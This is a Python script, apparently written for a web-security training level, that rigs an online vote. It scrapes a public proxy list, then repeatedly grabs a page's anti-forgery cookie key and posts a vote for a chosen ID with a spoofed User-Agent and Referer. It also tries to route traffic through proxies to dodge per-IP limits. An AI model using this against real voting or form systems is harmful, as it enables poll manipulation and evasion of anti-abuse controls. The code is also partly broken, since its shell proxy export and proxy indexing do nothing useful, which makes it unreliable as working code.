#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import os
import sys
import urllib3

def getProxies(url):
    listProxies = []
    lenCheck = 0
    index = requests.get(url)
    soup = BeautifulSoup(index.content, 'html.parser')
    for i in range(150, 300, 1):
        results = soup.find_all('tr')[i]
        for x in results:
            x = str(x).replace("<td>", "")
            firtsLetter = x.replace("</td>", "")
            if (firtsLetter[0] >= '0' and firtsLetter[0] <= '9'):
                listProxies.append(firtsLetter)
    print(listProxies)
    return listProxies

def getVotes(url, id):
    listId = []
    state = requests.get(url)
    soup = BeautifulSoup(state.content, 'html.parser')
    results = soup.find_all('tr')
    for x in results:
        vote = str(x).replace("<td>", "")
        firtsLetter = vote.replace("</td>", "")
        firtsLetter = firtsLetter.replace("<tr>","")
        firtsLetter = firtsLetter.replace("</tr>","")
        firtsLetter = firtsLetter.replace("\n","")
        firtsLetter = firtsLetter.replace(" ", "\n")
        firtsLetter = firtsLetter.split()
        listId.append(firtsLetter)

    for i in range(len(firtsLetter)):
        if (int(firtsLetter[i][0]) == id):
            print("HELOOO")
    print(listId)


url = "http://158.69.76.135/level4.php"
urlProxies = "https://free-proxy-list.net/index.html"

proxies = getProxies(urlProxies)
getVotes(url, int(sys.argv[1]))

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level4.php'}
with requests.session() as client:
    for i in range(10):
        lenProxi = 0
        os.system("unset HTTP_PROXY")
        key = client.get(url)
        key_dic = key.cookies.get_dict()
        cookies = key.cookies['HoldTheDoor']
        data_post = {
			"id": 1,
			"holdthedoor": "Submit",
			"key": key_dic['HoldTheDoor']
		}
        #os.environ["HTTP_PROXY"] = "http://" + proxies[lenProxi] + ":" + proxies[lenProxi + 1]
        #os.environ["HTTP_PROXY"] = "http://112.78.191.35:8080"
        os.system("export HTTP_PROXY=" + '"' + "110.74.222.213:52733" + '"')
        try:
            client.post(url, data=data_post, headers = headers, cookies={'HoldTheDoor': cookies})
        except (requests.exceptions.Timeout, requests.exceptions.Timeout, urllib3.exceptions.MaxRetryError) as mg:
            print(mg)
        lenProxi += 2